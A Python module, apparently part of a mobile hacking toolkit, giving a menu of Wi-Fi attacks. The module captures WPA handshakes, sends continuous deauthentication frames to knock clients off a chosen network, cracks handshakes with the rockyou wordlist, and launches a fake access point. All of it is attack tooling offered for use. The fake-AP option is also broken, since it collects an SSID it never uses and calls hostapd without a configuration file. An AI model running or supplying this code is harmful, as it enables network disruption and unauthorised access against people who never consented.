# wireless.py
from utils import run_cmd, log_event

def wireless_menu():
    print("""
[1] Scan Networks
[2] Capture Handshake
[3] Deauth Attack
[4] Crack WPA
[5] Fake AP
[0] Back
""")
    return input("wireless> ")

def run_wireless():
    choice = wireless_menu()
    if choice == "1":
        print(run_cmd(["termux-wifi-scaninfo"]).stdout)
        log_event("Wireless: Scan")
    elif choice == "2":
        b = input("BSSID> "); c = input("Channel> ")
        run_cmd(["airodump-ng","-c",c,"--bssid",b,"-w","capture","wlan0mon"])
        log_event(f"Wireless: Capture handshake {b}")
    elif choice == "3":
        b = input("BSSID> ")
        run_cmd(["aireplay-ng","--deauth","0","-a",b,"wlan0mon"])
        log_event(f"Wireless: Deauth {b}")
    elif choice == "4":
        h = input("Handshake (.cap)> ")
        run_cmd(["aircrack-ng",h,"-w","wordlists/rockyou.txt"])
        log_event(f"Wireless: Crack WPA {h}")
    elif choice == "5":
        s = input("Fake AP SSID> ")
        cmd = ["hostapd","-B","-i","wlan0","-e","/etc/hostapd/entropy.bin"]
        run_cmd(cmd, check=True)
        log_event(f"Wireless: Fake AP {s}")
    elif choice == "0":
        return
    else:
        print("[!] Invalid option.")
